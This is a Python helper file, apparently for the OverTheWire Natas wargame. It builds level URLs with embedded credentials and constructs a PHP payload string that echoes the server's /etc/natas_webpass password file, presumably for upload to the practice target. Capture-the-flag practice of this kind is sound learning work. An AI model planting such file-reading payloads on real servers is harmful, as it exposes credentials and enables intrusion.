from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
import json
import requests
from requests.auth import HTTPBasicAuth
import random
import os
import time

def build_url(username = None, password = None, level = 0, end_arguments = None):
    output = "http://"
    if password is not None:
        if username is None:
            username = f"natas{level}"
        output += f"{username}:{password}@"
    output += f"natas{level}.natas.labs.overthewire.org/"
    if end_arguments is not None:
        output += end_arguments
    return output

def build_webpass_path(level = 0):
    return f"/etc/natas_webpass/natas{level}"

def build_php_file_reader(level):
    return f"<?php echo file_get_contents('{build_webpass_path(level)}'); ?>"

def create_random_temp_file(extension): # returns the path to the file, makes sure it doesn't already exist
    for x in range(100): # try 100 times
        path = f"/tmp/{hex(random.randint(0, 1000000000))[2:]}.{extension}"
        if not os.path.exists(path):
            return path
    raise RuntimeError("Could not create random temp file with extension " + extension)